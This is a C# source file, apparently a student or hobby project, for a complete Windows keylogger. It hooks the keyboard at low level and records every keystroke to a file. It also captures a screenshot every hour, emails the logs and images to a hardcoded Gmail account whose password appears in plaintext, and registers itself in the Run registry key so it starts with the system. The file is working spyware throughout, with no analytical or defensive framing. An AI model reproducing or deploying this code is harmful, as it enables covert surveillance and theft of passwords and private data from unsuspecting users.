using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Ultity
{
    internal static class Program
    {
        #region hook key board

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log";
        private static string logExtension = ".txt";

        private static KeysConverter keysConverter = new KeysConverter();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState, StringBuilder receivingBuffer, int bufferSize, uint flags);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetCharsFromKeys(int keys)
        {
            StringBuilder charPressed = new StringBuilder(256);
            ToUnicode((uint)keys, 0, new byte[256], charPressed, charPressed.Capacity, 0);
            return charPressed.ToString();
        }

        private static void WriteLog(int vkCode)
        {
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtension;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            //string str = ((Keys)vkCode).ToString();
            string str = GetCharsFromKeys(vkCode);
            sw.Write(str);
            sw.Close();
        }

        private static void HookKeyBoard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        #endregion hook key board

        #region Timer

        private static void StartTimer()
        {
            Thread thread = new Thread(
                () =>
                {
                    while (true)
                    {
                        Thread.Sleep(3600000);
                        CaptureScreen();
                        SendMail();
                    }
                }
                );
            thread.IsBackground = true;
            thread.Start();
        }

        #endregion Timer

        #region Capture

        private static string imagePath = "Image_";
        private static string imageExtension = ".png";
        private static int imageCount = 0;

        private static void CaptureScreen()
        {
            //tao bit map
            var bmpScreeenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            //tao mot doi tuong do hoa tu bitmap
            var gfxScreenshot = Graphics.FromImage(bmpScreeenshot);
            //copy tat ca cac diem anh tren man hinh
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToString("dd-MM-yyyy_hhmmss") + imageCount, imageExtension);

            try
            {
                bmpScreeenshot.Save(imageName, ImageFormat.Png);
                imageCount++;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        #endregion Capture

        #region Mail

        private static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("cuong1998pro@gmail.com");
                mail.To.Add("cuong1998pro@gmail.com");
                mail.Subject = "Date: " + DateTime.Now.ToString("dd/MM/yyyy hh:mm:ss");
                mail.Body = "Log: ";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtension;
                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);
                    mail.Body += sr.ReadToEnd();
                    sr.Close();
                    File.WriteAllText(logFile, String.Empty);
                }

                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);
                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                    {
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                    }
                }
                smtpServer.Port = 587;
                smtpServer.Credentials = new System.Net.NetworkCredential("cuong1998pro@gmail.com", "cuonglog");
                smtpServer.EnableSsl = true;
                smtpServer.Send(mail);

                Console.WriteLine("Send Mail");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        #endregion Mail

        #region Registry start window

        private static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        #endregion Registry start window

        private static void Main(string[] args)
        {
            StartWithOS();
            StartTimer();
            HookKeyBoard();
        }
    }
}